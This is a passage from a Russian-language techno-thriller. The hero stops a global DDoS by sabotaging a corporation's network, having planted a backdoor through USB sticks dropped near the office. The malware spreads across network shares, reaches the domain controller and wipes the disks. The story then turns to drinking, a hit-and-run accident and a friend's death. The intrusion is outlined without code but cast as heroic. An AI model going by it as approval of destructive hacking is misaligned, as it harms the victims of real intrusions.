   Кирилл снова взглянул на часы: половина второго. Тем временем в сети
что‑то понемногу стало меняться. Похоже, первая волна атаки, которой под‐
верглись банки и крупные интернет‑сервисы, отвлекла внимание безопас‐
ников, и теперь основной удар обрушился на корневые и региональные DNS-
серверы. Туда хлынула лавина мусорных запросов, и сервера буквально зах‐
лебнулись в этом бурном потоке, а многие сайты становились недоступными
на глазах. Это уже выходило далеко за рамки сценария из давешнего аме‐
риканского письма. Если дела так пойдут и дальше, к вечеру неизбежно нас‐
тупит коллапс.
  В три пополудни новый удар пришелся на ресурсы магистральных провай‐
деров. Возросший трафик на границах их сетей практически парализовал
маршрутизацию, и сайты на компьютерах пользователей перестали откры‐
ваться. Там, где сеть еще хоть как‑то работала, гуляли панические и противо‐
речивые слухи о «тотальном отключении интернета» и «иностранном втор‐
жении». Движимые желанием получить самую свежую информацию, сотни
тысяч пользователей настойчиво лезли в сеть, еще больше увеличивая наг‐
рузку на умирающую инфраструктуру.
 — Что там творится на уровне протоколов, кто‑нибудь в курсе? — спросил
Кирилл, вглядываясь в свой терминал.
  Он почувствовал, как сердце начинает биться быстрее.
 — HTTP-флуд, UDP-флуд, амплификация, — ответил Шпала. — Полный
комплект. Пишут, запросы идут через прокси буквально отовсюду, отследить
источники будет непросто.
   Спустя сорок минут Кирилл начал замечать первые попытки организован‐
ного противодействия происходящему. Администраторы стали принудитель‐
но ограничивать доступ пользователей к отдельным узлам и начали изолиро‐
вать атакующие сегменты глобальной сети. Пока эти меры помогали слабо,
интенсивность атак не снижалась.
   Кирилл смотрел в экран, лихорадочно пытаясь собрать в кучу разбега‐
ющиеся мысли. Вполне возможно, источник вредоносного трафика — это и
вправду сотни тысяч разбросанных по всей планете машин с установленным
на них софтом TerraCore. Этот самый софт работал на компьютерах, сер‐
верах, промышленных контроллерах… Изолировать эти устройства невоз‐
можно, они уже давно стали частью интернета, его кровеносной системы.
США, Европа, Азия, Латинская Америка. Точки на карте, разбросанные, будто
звезды на ночном небосклоне. Такая слаженность требовала централизован‐
ного управления. Что‑то должно координировать эту атаку, отдавать команды,
распределять ресурсы, балансировать трафик… У этого цифрового оркестра
непременно должен быть дирижер.
  В памяти всплыли слова Маркуса Рейвса — Кирилл уже не сомневался,
кто именно  скрывается за псевдонимом Darkoder: «Перцептрон» может
не только обнаруживать и предотвращать атаки, но и управлять ими.
  Мысль вонзилась в сознание, словно острый гвоздь. Кирилл смотрел
на пульсирующие пики графиков на экране и вдруг осознал, что каждый байт,
каждый пакет  данных  двигается по невидимым дорожкам,  складываясь
в убийственно красивую и беспощадную симфонию хаоса. Но если исчезнет
дирижер, оркестр не сможет продолжить этот концерт. Наступит не тишина,
а какофония. Потоки данных начнут запутываться, утопая в бессмысленности,
словно реки, выброшенные из русла. Без дирижера атака потеряет изначаль‐
но задуманную кем‑то структуру, а значит, станет неподвластной контролю.
   Взгляд Кирилла переместился с экрана на клавиатуру, потом — на кружку
с недопитым кофе, словно на ее дне прятался ответ на не заданный им воп‐
рос. Он знал, что такое децентрализованные сети. Говорят, их невозможно
уничтожить. Но в этой сети существовало нечто, что управляло ей, а значит…
  Мысль была настолько пугающей, что Кирилл почувствовал, как холодок
пробежал по позвоночнику. В голове возник отчаянный план. Он не был уве‐
рен, сработает ли это, но по крайней мере он попытается. Только если Санчо
не подвел и все‑таки выполнил его просьбу… Где, интересно, его черти
носят, когда он так нужен?
 — Парни, у кого‑нибудь есть дата‑кабель для телефона? — спросил
Кирилл.
   Неважно,  сколько раз ты  споткнешься по  пути, не  страшно, если
не получится с первого раза. Главное — идти.
  Он попробует. И будь что будет.
   Кирилл воткнул переданный ему Финчем шнур в компьютер. Мобильник
в качестве GPRS-модема — не самое быстрое средство связи, но интернет
от провайдера уже практически умер, а сотовый оператор еще хоть как‑то
держался. Кирилл установил соединение, запустил терминал и принялся вби‐
вать в него команду за командой. Казалось, мозг сам превратился теперь
в мощную программу, отсеявшую посторонний шум и сфокусировавшуюся
на значимых данных. Одни и те же мысли проносились в голове, словно
назойливый мотив, от которого невозможно избавиться: только бы получи‐
лось, только бы не обвалился канал…
   Инфраструктура TerraCore и вправду напоминала неприступные бастионы
средневековой крепости. Стоящий на страже «Перцептрон» пресечет даже
малейшую попытку проникнуть за охраняемый периметр, а архитекторы этой
твердыни предусмотрели все возможные хакерские лазейки… Все, кроме
банального человеческого фактора.
   Иногда даже самые простые вещи ломают самые сложные механизмы.
   Бегущие в окне терминала команды вдруг замерли, и на экране появилась
строка с мигающим курсором, терпеливо ожидающая ввода.
   Санчо все‑таки сдержал свое слово.


ЗА НЕСКОЛЬКО ДНЕЙ ДО ЭТОГО
Сегодня Шарлотта пребывала в прекрасном настроении. В пятницу семей‐
ный суд поставил жирную точку в ее бракоразводном процессе, к тому же ей
удалось договориться с сестрой о том, что в этот уик‑энд та присмотрит
за детьми. А значит, давно намеченные планы наконец‑то воплотятся в реаль‐
ность. Эндрю уже снял уединенный лесной домик в Смоки‑Спрингз, и они
целых два дня смогут побыть наедине друг с другом. Уютный камин, джакузи,
барбекю и, конечно же, море секса. При мысли об этом Шарлотта ощутила
приятную тяжесть внизу живота… Уже скоро, осталось потерпеть всего лишь
один день.
  А вот и крыльцо офиса. Брошенный по сторонам мимолетный взгляд слу‐
чайно зацепил какое‑то яркое пятнышко на сером бетоне автомобильной
стоянки. Что это, брелок от машины? Нет, флешка! Похоже, обронил кто‑то
из спешащих на работу сотрудников «Терры».





Наклонившись, Шарлотта подняла миниатюрный пластиковый накопитель,
слегка  припорошенный дорожной пылью. На боковой  грани виднелась
нанесенная краской надпись серебристыми буквами: TerraCore, а рядом —
еле заметный логотип компании. Ну точно, выронил кто‑то из коллег. Первой
мыслью было оставить находку на ресепшене, но любопытство все же взяло
верх. Повертев в руках флешку, она быстро спрятала ее в карман пиджака.
   Войдя в здание, Шарлотта миновала девушку за стойкой, вяло кивающую
всем проходящим, и поднялась на свой этаж. В открытом офисном прос‐
транстве сотрудники уже начинали собираться на утренние совещания, раз‐
давался гул голосов, звонки телефонов, щелканье клавиатур. Шарлотта опус‐
тилась в кресло в своем небольшом закутке, который с натяжкой можно было
назвать кабинетом. Включила компьютер, быстро вставила флешку в порт
рабочего ноутбука и замерла в ожидании.
   Система мгновенно распознала устройство. Открылось окно провод‐
ника — какие‑то  картинки с милыми  котятами,  несколько  сохраненных
из интернета кулинарных рецептов… «Похоже, ничего интересного», — расс‐
троенно подумала Шарлотта. Она и не заметила, как на ее машину скопиро‐
валась, а потом запустилась крошечная программа, тихо уничтожив на флеш‐
ке собственный исходный файл.
  И конечно же, Шарлотта не знала, что несколько в точности таких же фле‐
шек сегодня утром нашли неподалеку от офиса другие сотрудники компании.
Один оставил ее себе, чтобы посмотреть содержимое дома, другой передал
накопитель дежурившей на первом этаже девушке, а двое, как и она сама,
подключили флешку к своим служебным компьютерам…
  А от офисных корпусов неспешной походкой удалялся очень довольный
собой смуглый молодой  мужчина. Сегодня ему опять  удалось  влегкую
заработать полсотни баксов. И главное, даже не пришлось нарушать законы.

                       ***

— Морозов! Подойди‑ка ко мне на пару слов.
   Появившийся невесть откуда Станислав Викторович был явно чем‑то
недоволен. Неохотно отлипнув от терминала, Кирилл поднялся со своего
рабочего места и направился к окну, где поджидал его сурово хмурящий бро‐
ви начальник.
 — Где Увалов? — не давая ему опомниться, рявкнул Кущин.
 — Понятия не имею, с утра его не видел, — пожал плечами Кирилл.
 — Тогда вот тебе еще один вопрос. Где твой пропуск?
   Кирилл похлопал руками по карманам, словно надеясь все‑таки найти эту
проклятую пластиковую карточку.
 — Не знаю… Наверное, засунул вчера вечером куда‑то…
 — Зато я знаю. Я посмотрел по камерам, сегодня в шестом часу утра
Александр Увалов покинул здание и вышел за охраняемую территорию
на улицу. А логи системы контроля доступа говорят, что воспользовался он
твоим магнитным пропуском! Знаешь, что это значит?
   Кирилл почувствовал, как у него все похолодело внутри.
 — Что?
 — Он отбывает уголовное наказание в виде исправительных работ, вот
что. И я должен сообщить о побеге. Его объявят в розыск, долго прятаться он
не сможет. В метро, на вокзалах, да буквально везде будут висеть ориенти‐
ровки. Но самое главное, что ты, будучи старшим в группе, не уследил за сво‐
им товарищем. Если думаешь, что неприятности тебя лично не коснутся, то
ошибаешься.
 — Я не просился на эту должность.
 — А мне плевать! Если завтра к восьми утра Увалова здесь не будет, пеняй
на себя. Делай что хочешь, времени у тебя мало. Поймают твоего приятеля, я
лично похлопочу, чтобы его законопатили на зону куда‑нибудь подальше,
за полярный круг.
   «Похоже, Кущину ой как не хочется выносить сор из избы, потому что он
и сам огребет по первое число за бегство подопечного», — невольно
подумалось Кириллу. Значит, еще есть шанс что‑то исправить.
 — Хорошо, я верну его к завтрашнему утру, — твердо сказал он. — Но сна‐
чала мне нужно кое‑что здесь закончить.
GEEK





  Мы считаем себя самыми могущественными существами в обитаемой
вселенной. Мы верим, что обладаем властью над технологиями, но порой
обстоятельства заставляют нас признать, что это лишь самообман. Тех‐
нологии похожи на волны цунами, что катятся к берегу, размывая все на сво‐
ем пути. Только те, кто умеет плавать, смогут выжить в этом бурном потоке.
   Кирилл смотрел в черное зеркало терминала, а его отражение молчаливо
глядело ему в глаза из этой бездны. Остался последний шаг. Одна случайная
ошибка — и все будет потеряно.
   Логин. Пароль. Enter. Кирилл ввел короткую команду, пробуждая спящую
до поры до времени программу на диске компьютера, расположенного
в тысячах километров отсюда. Бэкдор, перебравшийся в ноутбук Шарлотты
с флешки и затаившийся в сети TerraCore, получил сигнал и начал действо‐
вать. Кирилл до боли в глазах всматривался в каждый вводимый символ, а его
пальцы, чуть замирая, продолжали набирать команды. Сейчас он вновь пой‐
мал то самое ускользающее ощущение волшебства — чувство всемогущес‐
тва, позволяющего манипулировать этой реальностью. Осознавать, как каж‐
дый его шаг меняет что‑то важное на другом конце земли.
   Оживший бэкдор проверил наличие открытых на запись папок в сетевом
окружении и сохранил там свою копию, тут же запустив бинарник на исполне‐
ние. Затем он сообщил о готовности  скачать дополнительные модули,
которые Кирилл подготовил заранее. Программа начала незаметно переме‐
щаться по сети, шаг за шагом, словно пешка на шахматной доске, уклоняясь
от ударов более могущественных фигур и стараясь избегать опасных клеток.
Кирилл внимательно следил за происходящим: это небольшое приложение,
за написанием и тестированием которого он провел несколько бессонных
ночей, перенесло его туда, куда он давно мечтал попасть, — в самое сердце
сети TerraCore.
   Кирилл вел себя осторожно. Он избегал любых действий, которые мог‐
ли бы вызвать подозрение у системы мониторинга. Каждый запрос бэкдора,
каждое новое подключение к удаленному узлу тщательно маскировались
под стандартную сетевую активность. Виртуальная пешка изо всех сил ста‐
ралась не привлекать внимания, ведь в игре, которую затеял Кирилл, любая
случайность могла стоить слишком дорого.
   Наконец, долгие минуты напряженного ожидания оказались вознаграж‐
дены: Кирилл получил данные с контроллера домена. Пешка была готова
стать ферзем. Киря на мгновение замер, сердце забилось быстрее. Он никак
не мог отделаться от ощущения, что искусственный интеллект, против которо‐
го он затеял эту опасную игру, пристально наблюдает за ним, в любую секун‐
ду готовясь дать отпор.
  Он ввел следующую команду, запуская модуль, что активировал все рас‐
ползшиеся по сети копии вредоносной программы. Почувствовавшая нелад‐
ное система недовольно заворочалась: она начала блокировать подоз‐
рительные соединения, пытаясь нащупать источник вторжения. Но было уже
поздно: этот бой она проиграла. Враг уже внутри крепостной стены. Серверы
в сети TerraCore отключались один за другим, уходя в перезагрузку, а после
нее растерянно зависали, не обнаружив на дисках операционной системы.
   Кирилл с растущим возбуждением наблюдал, как сеть корпорации, казав‐
шаяся неприступной и несокрушимой, распадалась на глазах. Она была
похожа на огромный живой организм, вдруг потерявший контроль над своим
телом. Серверы погружались в цифровую кому, оставляя после себя лишь
холодное, мертвое молчание. Система отчаянно пыталась восстановиться,
но ее усилия больше походили на предсмертные конвульсии. Остатки «Пер‐
цептрона» изо всех сил стремились реанимировать сеть, но вредоносный
код, разошедшийся по узлам, ломал его логику, менял конфигурационные
файлы и вводил в заблуждение все механизмы восстановления.
 — О, интенсивность атаки снижается, — раздался в тишине чей‑то голос,
кажется, Грека.
   Кирилл не обратил внимания на этот возглас, отвлекаться сейчас от дела
было еще слишком рано. Он открыл новую сессию, подключаясь к одному
из последних активных серверов. ARCHIVE-01, Кирилл прекрасно помнил
это имя из того самого файла, содержащего схему сети: здесь хранились
резервные копии. Его пальцы застучали по клавишам. Канал все еще оста‐
вался слишком медленным, слить многогигабайтовое содержимое этого хра‐
нилища не получится даже теоретически, поэтому он отдал своей программе
простую команду, и она начала действовать. Троян не просто сотрет все фай‐
лы на дисках, а забьет секторы нулями. Восстановить что‑либо после этой
операции будет попросту невозможно.
   Вот теперь можно отключаться. Кирилл разорвал соединение и ощутил
навалившуюся на него свинцовой тяжестью тишину. Только звуки вентилято‐
ров в системных блоках напоминали, что мир вокруг него все еще существу‐
ет. Однако вместо радости от успешно проделанной работы изнутри накати‐
ло странное опустошение.
   Сеть TerraCore перестала существовать, вместе с ней исчез и «Перцеп‐
трон» — творение, которое могло изменить будущее человечества. Кирилл
вдруг подумал, что в этот миг он и сам навсегда лишился того, что подог‐
ревало его азарт. Он почувствовал, как вместе с напряжением уходит что‑то
большее. Как бесследно исчезает, растворяется цифровой мир, в котором он
когда‑то нашел себя, а теперь своими руками поставил точку в его истории.
А еще пришла уверенность, что корпорация наверняка не оставит это просто
так. Возможно, прямо сейчас где‑то уже сидят за своими компьютерами ана‐
литики, пытаясь понять, кто же нанес компании такой сокрушительный удар.
Эта победа, какой бы значительной она ни казалась, совершенно точно
не станет финалом. Но Кирилл отмахнулся от этой мысли. Он сделал то, что
должен был сделать, и другого пути у него попросту не было.
   Часы показывали половину седьмого, за окнами сгущались влажные
сумерки, предвестники близкой осени. Нужно спешить: у него осталось
незавершенным еще одно важное и очень срочное дело.

                       ***

Найти человека в огромном малознакомом городе — почти неосуществимая
задача. Если, конечно, ты не знаешь, где его искать. Телефон Санчо был вык‐
лючен, но Кирилл ожидал этого. Он поплотнее запахнул свою летнюю куртку
и застегнул молнию, спасаясь от вечерней прохлады, а потом поднял руку,
останавливая такси.
   Туристический сезон уже пошел на спад, но здесь всегда было ярко, шум‐
но и людно: центр города, традиционное место для  развлечений и ночных
тусовок. Ослепительный неоновый свет и громкая музыка густым потоком
лились из заведений на улицу, и Кирилл подумал, что жителям окрестных
домов, наверное, не слишком приятно проводить ночи напролет под ритмы
диско и выкрики подвыпивших гуляк.





Клуб‑бар «Телеграф» сегодня был полон. За пультом в неровном свете про‐
жекторов, прорезающих разноцветными лучами клубы сигаретного дыма,
хозяйничал круглый, как мячик, и такой же подвижный диджей — видимо, тот
самый Winnie. Кирилл нырнул в прокуренный зал, словно в омут, наполненный
тяжелым ритмом басов. Санчо обнаружился в самом дальнем углу, он устро‐
ился на обитой потертой кожей лавке, протянувшейся вдоль стены, с опо‐
ловиненным стаканом вискаря в руке. В янтарной жидкости медленно оплы‐
вали кубики льда.
 — Нашелся, — Кирилл плюхнулся рядом, почувствовав, как деревянное
сиденье скрипнуло под его весом.
   Саня поднял на него слегка затуманенный взгляд.
 — О, Кирюха, — на лице друга появилось подобие улыбки, — присоеди‐
няйся! Я тут культурно отдыхаю.
 —  Культурно  отдыхаешь до  первого  наряда  ментов, —  напомнил
Кирилл. — Тебя уже ищут, и рано или поздно найдут.
 — Да и плевать, — легкомысленно отмахнулся тот, — зато прямо сейчас я
чувствую себя человеком. Ты даже не представляешь, насколько мне осто‐
чертело торчать в этой вонючей дыре.
 — Саня, — Кирилл наклонился ближе, пытаясь перекричать грохот музыки
и шум голосов. — Ты себя гробишь. Я понимаю, надзор, ограничения…
Но потерпи немного. Закончится срок, и ты сможешь делать, что захочешь.
 — Не‑а, — покачал головой Санчо и залпом допил остатки вискаря. —
Кирюха, глянь вокруг. Думаешь, все эти люди делают, что хотят, и по‑нас‐
тоящему свободны? Да ни фига подобного. Общество устанавливает нам
рамки, выбраться из которых невозможно, даже если тебя никто не держит
взаперти. То, что мы с тобой делаем, бро, на время дает нам ощущение сво‐
боды. Но это тоже иллюзия. Вот прямо здесь и сейчас я не чувствую никаких
ограничений. Правда, это пройдет, когда протрезвею.
   «О, пошла хмельная философия», — подумал Кирилл. Санчо был в своей
стихии — пьяный, циничный и до  крайности убедительный,  когда дело
касалось оправданий.
 — Ладно, пойдем, тут слишком шумно. — Санчо поставил опустевший ста‐
кан прямо на пол и решительно поднялся на ноги. — Найдем местечко поуют‐
нее.
   Ночная прохлада пахла дождем и сыростью — но после прокуренной
атмосферы клуба она настолько освежала, что Кирилл невольно вздохнул
поглубже.  Санчо  приостановился  на  мгновение,  щелкнул  зажигалкой,
закурил. Они миновали старый сквер, погруженный в полумрак. Пустые ска‐
мейки под редкими фонарями словно ждали кого‑то, кто обещал скрасить их
одиночество, но забыл о назначенной встрече.
 — Кирюха, ты ведь всегда был умным, — сказал вдруг Санчо, выпуская
в темное небо облачко дыма. — Зачем ты тащишь меня из этого болота?
 — А сам как думаешь? — спросил в ответ Кирилл. — Ты мой друг, Саня.
Мы вместе через многое прошли. И если ты считаешь, что можно просто
сдаться и оставить все как есть, то я так не думаю. Ты сильнее, чем хочешь
казаться.
   Санчо усмехнулся и снова затянулся, глядя куда‑то вдаль. Его лицо, осве‐
щенное мягким светом фонарей, казалось одновременно уставшим и задум‐
чивым.
 — Знаешь, что самое дурацкое? — тихо спросил он. — Иногда мне кажет‐
ся, что я уже сделал все, что мог. Что дальше — просто пустота. А ты
говоришь — «сильнее»… Я, может, и был сильным, да только силы эти уже
давно закончились.
 — Если не перестанешь барахтаться, не утонешь, — повернулся к нему
Кирилл, — а если чувствуешь, что идешь ко дну, цепляйся за что угодно.
Да хоть за меня. Пока сам не решишь, что пора сдаться, шансы есть.
 — Тут имеется одна фундаментальная проблема, — хмыкнул Санчо, и на
его лице появилось хитрое выражение, — ты еще трезвый, а я уже нет.
Это надо срочно исправить, иначе у нас с тобой синхронизация сбоит. Заг‐
лянем‑ка сюда, пожалуй.
  Чем хорош центр Питера — так тем, что здесь полно круглосуточно
работающих забегаловок, где всегда рады запоздалым гостям. Ребята шаг‐
нули в тесное полуподвальное помещение, в которое, как в склеп, вели про‐
резанные в асфальте ступени. Санчо деловито осмотрел представленный
в стеклянной витрине ассортимент закусок и распорядился:
 — Две по сто водочки, два бутерброда с ветчиной и два стакана томатного
сока.
   Бармен быстро исполнил заказ, поставив запрошенное на пластиковый
поднос, и Саня с Кирей удалились за столик в глубине небольшого зала.





— Надо было все‑таки графин на ноль пять брать, — с сожалением сказал
Санчо, поднимая свою стопку. — Ну, давай!
   Кирилл запоздало вспомнил, что ничего толком не ел аж с самого утра.
Огненная жидкость провалилась в пищевод, а в ушах приятно зашумело. Тело
окутала уютная теплота, его качнуло на мягких волнах.
 — Уф‑ф, — шумно выдохнул Санчо, — неплохая водка. Закусывай давай.
 — А помнишь, как мы после школы на набережной пили? — спросил
Кирилл, в голове которого закрутился целый вихрь ярких воспоминаний.
 — Ага, в кустах у старой лесопилки. Мы эту бутылку, кажись, у какой‑то
бабки возле вокзала купили.
 — Ну да, они там по выходным до сих пор торгуют.
 — Паршивая водка была, паленая, — поморщился Саня, — я потом пол‐
дня с нее блевал.
 — А как на великах по парку катались?
 — Помню, с нами как‑то Тимурыч с параллельного класса увязался, —
хохотнул Санчо, — мы с тобой еще веревки притащили, по деревьям лазить.
У него тогда цепь на веле порвалась, мы его на буксир взяли. Себе веревки
под седла привязали, ему за руль. Там дорожка в парке шла под уклон и раз‐
ветвлялась, помнишь? А посередине дуб рос. Только разогнались, ты крик‐
нул: «Поворачиваем!» Я повернул налево, ты — направо…
   Кирилл засмеялся до слез, вспоминая этот красочный эпизод. Тимуру тог‐
да, правда, было не до смеха, он еще долго не мог поверить, что они с Саней
не придумали эту выходку заранее.
 — Еще по соточке? — предложил Санчо.
 — А давай.
   Выпив и закусив бутербродами, друзья выбрались на улицу. Ночной город
снова принял их в свои объятия, дохнув в лицо влажным ветром с Невы.
Кириллу показалось, будто окутавшая крыши домов ночь чуть потеплела,
словно кто‑то незаметно накрыл скверы и переулки теплым ватным одеялом.
Краски стали мягче, звуки глуше, а тяжесть, давившая на плечи весь вечер,
вдруг куда‑то испарилась. В голове вспыхнула странная ясность, будто все
проблемы, заботы и тревоги превратились в ненужный мусор, который можно
одним движением смести с рабочего стола и навсегда удалить из реальнос‐
ти.
 — Хорошо, но мало, — озвучил его мысли Саня. — Смотри, Кирюх,
как тебе такое название?
   Санчо указывал на сияющую в ночи желтым неоном вывеску очередного
ночного бара: «Трианон».
 — Пейте водку в «Трианоне», на работе меньше вони! — выдал экспром‐
том Санёк и решительно повернул к входу. — За мной!
   Здесь они  поступили  предусмотрительнее,  сразу заказав  пол‑литра
в запотевшем графине, салат и бутерброды с колбасой.
 — Ну, давай! — Санчо поднял свою стопку, наполненную до краев.
 — В последний раз я так выпивал, когда мы в игровом клубе с тобой
зависали, — сказал Кирилл, опрокидывая в себя очередную порцию водки.
 — Это на Лавриках, что ли? — уточнил Санчо. — Помню‑помню. Ты тогда
выглядел весьма утомленным, я тебя на себе домой тащил. Тетя Ира была
несколько обескуражена твоими игровыми достижениями.
 — Ой, а давай посчитаем, сколько раз я тебя домой притаскивал? — оби‐
женно поджал губы Кирилл. — У меня, знаешь ли, спина не железная, а ты
каждый раз думаешь, что я время от времени лошадью подрабатываю.
 — За это обязательно нужно выпить! — поднял свою стопку Санчо. —
Давай, дружище, чтобы тебе седло не терло и подковы не жали!
   Графин опустел на две трети, и Кирилл уже чувствовал: Николай Коперник
и Галилео Галилей были полностью правы, утверждая, что планета вер‐
тится, — он ощущал это вращение совершенно явно и отчетливо.
 — Сань, — произнес он, решив высказать главную мысль, пока язык
еще худо‑бедно его слушается, — хорош дурить, возвращайся. Кущин сказал,
если до утра придешь, ничего не будет.
 — Хрен с тобой, — на удивление легко согласился тот, — потерплю эту
рожу маленько. Давай еще по одной.
   Опустошив графин, друзья выбрались на свежий воздух и не слишком
твердой походкой зашагали по направлению к их обиталищу. Было уже
за полночь, центр города остался позади, а впереди расстилались лишь пус‐
тынные улицы, мигающие желтыми зрачками светофоров. Ночные забегалов‐
ки здесь  практически  исчезли, зато  появились  круглосуточные  ларьки,
в одном из которых друзья взяли по пиву. Город спал, умаявшись за день,
и серые низкие облака вдруг решили умыть его мелким прохладным дож‐
диком.





Попетляв по переулкам, они выбрались на безлюдную набережную канала.
Тут не было ни души, только железный торговый павильон напротив проход‐
ной, ведущей на территорию их конторы, приветливо светился тусклыми
окнами витрин.
 — Давай еще по пиву, — предложил Кирилл, чувствуя, что для завершения
этого чудесного вечера не хватает какого‑то финального аккорда.
 — Не возражаю, — охотно согласился Санчо.
   Обитавшая в ларьке девушка показалась Кириллу приятной и очень милой.
Расплатившись, он забрал две бутылки пива и протянул их Сане, который лов‐
ко откупорил добычу зажигалкой.
 — Знаешь, — сказал он, — ты, пожалуй, прав. Надо выкарабкиваться
из этой трясины. Выйду отсюда, устроюсь куда‑нибудь компам хвосты кру‐
тить. Заработаю денег, вернусь домой и еще каким‑нибудь бизнесом зай‐
мусь. Сайты делать буду или софт писать на заказ. Ты со мной?
 — Если позовешь, — улыбнулся Кирилл.
 — Считай, что позвал, — хлопнул его по плечу Санчо. — Ладно, пойдем,
что ли…
  Все произошло так стремительно, что Кирилл в первый миг даже не успел
осознать, что именно случилось. Он шагнул на проезжую часть, и мир кувыр‐
нулся перед глазами. Пронзительный визг тормозов, глухой удар. Кирилл
почувствовал, что летит. Падая, он услышал гулкий металлический звук —
темный силуэт Санчо влетел в железный столб, держащий знак пешеходного
перехода, и тряпичной куклой рухнул в канаву.
   Кирилл с трудом поднял голову. Яркий свет фар резанул по глазам, мел‐
кий дождь сеется пеленой в их желтом пятне. Машина в нерешительности
постояла  несколько  секунд,  а  затем,  взвизгнув  колесами,  рванула
по набережной, стремительно скрывшись за поворотом. Из ларька выбежала
испуганная продавщица, всплеснула руками и снова скрылась в глубине сво‐
его павильона.
   Кирилл встал на четвереньки, затем на колени и, наконец, покачиваясь,
осторожно поднялся на ноги. Удивительно, но, несмотря на чудовищный
удар, у него совершенно ничего не болело. Наверное, пьяным везет — он
как‑то слышал про пьяницу, свалившегося с балкона третьего этажа и отде‐
лавшегося лишь парой царапин.
  В канаве завозился Санчо, оскальзываясь, выбрался на дорогу. Ругаясь,
принялся отряхивать ладонями колени.
 — Ты цел? — спросил его Кирилл.
 — Да вроде, — отозвался тот, — шея только болит маленько. Не хреново
так нам прилетело, блин… Погляди, весь организм на месте?
   Кирилл включил фонарик на телефоне и принялся внимательно осматри‐
вать друга. Тот повернулся одним боком, другим, потом спиной.
 — Похоже, целый, грязный только весь.
   Куртка и джинсы Санчо и впрямь были насквозь пропитаны бурой при‐
дорожной жижей.
 — Да ты и сам на свинью теперь похож. Рукав вон порвал.
   Киря посмотрел на свисающий с плеча лоскут ткани, из‑под которого
проглядывала бледная кожа. «Черт с ним, с рукавом, — подумал он, — глав‐
ное, что живой».
 — Может, еще по пивку?
 — Не, хватит, — покачал головой Санчо. — Пойдем уже.
  Они перешли дорогу, предусмотрительно посмотрев по сторонам, Саня
достал из кармана Кирин пропуск и приложил его к магнитному замку на про‐
ходной. Внутренний дворик утонул во мраке, лишь одинокий фонарь заливал
его бледным светом, бросая желтоватые отблески на кирпичную кладку зда‐
ния. Санчо прошел в закуток напротив входа, опустился на скамейку под жес‐
тяным навесом, достал из кармана пачку сигарет и закурил. Кирилл заметил,
как нервно дрожат его руки, — зажигалка сработала только с четвертого
раза.
 — Вот ведь… — сказал Саня, глубоко затягиваясь сигаретой, — ты номер
машины не запомнил?
 — Какое там, — вздохнул Кирилл, — цвет и марку‑то не разглядел. Только
фары эти… И дождь.
 — Неслабо нас с тобой приложило. Башка не болит?
 — Болит немного, — признался Киря.
 — Завтра еще хуже болеть будет, — хмыкнул Саня. — Ты это… Если
родители потом спрашивать будут, скажи им, что я пытался. Ну, в смысле, все
по новой, с чистого листа.
 — Сам им потом и скажешь.
 — Скажу, — кивнул Санчо, соглашаясь. — Спасибо тебе, Кирюх. Не, прав‐
да, спасибо. Ты крутой, не знаю, что бы я без тебя делал… Иди, я тут побуду
еще немного.
  Он протянул Кириллу белый прямоугольник пропуска.
   Киря сжал холодный пластик в ладони и направился к двери — усталость
вдруг камнем навалилась на плечи. Пискнул кодовый замок, свинцовые ноги
тяжело подняли его по ступенькам на второй этаж. Кирилл остановился, что‐
бы перевести дух, выглянул в окно на лестничной клетке.
   Саня все еще сидел на скамейке, алый огонек сигареты вспыхивал яркой
точкой в темноте и снова гас. Словно почувствовав на себе его взгляд, Санчо
повернул голову и улыбнулся. Поднял ладонь, словно прощаясь.
  В коридоре было темно, Киря с трудом нащупал ручку двери своей ком‐
наты. Не стоило все‑таки столько пить, завтра наверняка будет очень‑очень
плохо… Скрипнули металлические петли, щелкнул замок за спиной. Гулко
капает вода из крана, из‑за стенки чуть слышно доносится привычный сосед‐
ский храп. Кирилл еще раз выглянул в окно.
   Скамейка была пуста.
  Не дожидаясь возвращения Санчо, он повалился прямо в одежде на кро‐
вать. Койка мерно заколыхалась под ним, точно корабль, покачивающийся
на прибрежных волнах. Едва закрыв глаза, Кирилл провалился в вязкую тем‐
ноту, напоминающую речной омут. Где‑то вдалеке серебристыми тенями
скользили гибкие и юркие рыбы, качались зеленоватые водоросли вокруг,
а сверху падали мутные столбы солнечного света, бесследно растворяясь
во мгле. Кирилл почувствовал, что погружается все глубже и глубже и, чтобы
выбраться наверх, к свету, нужно отчаянно плыть, рассекая густую, как сме‐
тана, толщу воды. Но тьма все сильнее и сильнее затягивала его, и вскоре
последние  отблески  света померкли,  оставив  только  чернильно‑черную
и непроглядную бесконечность вокруг.

                       ***

Пробуждение было ужасным. Все тело ломило, тяжелая голова буквально
раскалывалась на куски, во рту пересохло. Кирилл с трудом разлепил веки,
в нос ударил едкий больничный запах.
  Он  чуть  повернул  голову:  мешал  жесткий  пластиковый  воротник,
за какой‑то надобностью оказавшийся у него на шее. Голова тут же отоз‐
валась пронзительной нестерпимой болью. Накатила тошнота. Взгляд сфо‐
кусировался не сразу: незнакомая комната, широкое окно с пластиковыми
жалюзи, стены покрашены мерзкой желтой краской. Он лежал на кровати
с высокой металлической спинкой, стеклянный флакон капельницы на штанге
навис прямо над головой. Кирилл попытался пошевелиться, но вдруг осоз‐
нал, что его левая нога зажата какой‑то металлической конструкцией и поко‐
ится на подвесе, не позволяя даже повернуться на бок.
   Чьи‑то холодные пальцы коснулись лба. Кирилл скосил глаза и обомлел.
Знакомое лицо склонилось над ним, с испугом заглядывая в глаза.
 — Алла? — произнес он, не узнавая собственный голос.
 — Тише, — сказала она. — Ты четыре дня был без сознания.
 — А… Санчо? Как он?
   Трикси внимательно посмотрела ему в лицо, словно не узнавая, затем
отвела взгляд.
 — Санчо… Саши больше нет.
 — Как нет? По… почему? Мы зашли… Поговорили…
 — Где поговорили? Куда зашли? — подняла на него непонимающий
взгляд Трикси. — Вас нашли на дороге, на набережной, продавщица из круг‐
лосуточной точки скорую вызвала. Ты лежал на асфальте, Сашу на дорожный
знак отбросило, он шею сломал… Умер на месте, сразу.
   Кирилл опустил веки. Этого не может быть, ведь он помнит…
 — Лежи, набирайся сил, — услышал он откуда‑то издалека голос Аллы. —
Сейчас тебе нужно больше отдыхать. Поспи.
  И снова наступила темнота.

                       ***

Зима в этом году пришла рано, снег выпал в конце ноября и уже отказывался
таять. Мама, навещавшая его в больнице почти каждый день, принесла теп‐
лые вещи, поэтому Кириллу не было холодно. Больше никто не приходил
к нему до самой выписки: заглядывала ли к нему Трикси, или ее визит был
всего лишь болезненным наваждением, он не мог теперь сказать точно.
   Белоснежный наст захрустел под подошвами, и Кирилл, опираясь на пал‐
ку, осторожно спустился со ступеней. Перед входом в больницу был разбит
